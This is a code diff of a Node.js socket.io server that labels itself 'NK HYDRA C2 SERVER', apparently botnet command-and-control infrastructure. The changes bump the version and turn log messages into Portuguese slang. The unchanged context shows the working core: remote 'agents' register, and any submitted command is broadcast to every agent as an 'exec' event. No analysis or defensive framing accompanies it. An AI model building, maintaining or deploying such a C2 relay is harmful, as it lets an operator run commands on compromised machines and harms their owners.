@@ -1,4 +1,4 @@
-/* NK HYDRA C2 SERVER v34.0 */
+/* NK HYDRA C2 SERVER v36.0 */
 /* SINGULARITY HIVE PROTOCOL */
 /* FIX: HIGH TIMEOUTS FOR RENDER STABILITY */
 
@@ -10,7 +10,7 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => res.send('NK C2 v34 ONLINE'));
+app.get('/', (req, res) => res.send('NK C2 v36 - TUDO 3 ONLINE'));
 
 const server = http.createServer(app);
 const io = new Server(server, { 
@@ -21,15 +21,15 @@ const io = new Server(server, {
     transports: ['websocket', 'polling'] 
 }); 
 
-console.log("[*] SERVIDOR INICIADO. AGUARDANDO AGENTS...");
+console.log("[*] SERVIDOR INICIADO. AGUARDANDO OS MENOR (AGENTS)...");
 
 io.on('connection', (socket) => {
-    console.log(`[+] NEW CONNECTION: ${socket.id}`);
+    console.log(`[+] NOVA CONEXAO: ${socket.id}`);
     
     socket.on('identify', (data) => {
         if (data.type === 'agent') {
             const agentId = data.id || socket.id;
-            console.log(`[AGENT REGISTERED] ${agentId}`);
+            console.log(`[AGENT NA LINHA] ${agentId}`);
             
             // Broadcast to Dashboard
             io.emit('status', { 
@@ -48,7 +48,7 @@ io.on('connection', (socket) => {
     socket.on('cmd', (data) => {
         console.log(`[CMD] ${data.cmd} -> ${data.target}`);
         io.emit('exec', data); // Broadcast to all agents
-        io.emit('log', `[C2] SENDING COMMAND: ${data.cmd}`);
+        io.emit('log', `[C2] ENVIANDO ORDEM: ${data.cmd}`);
     });
 
     socket.on('stream_log', (data) => {
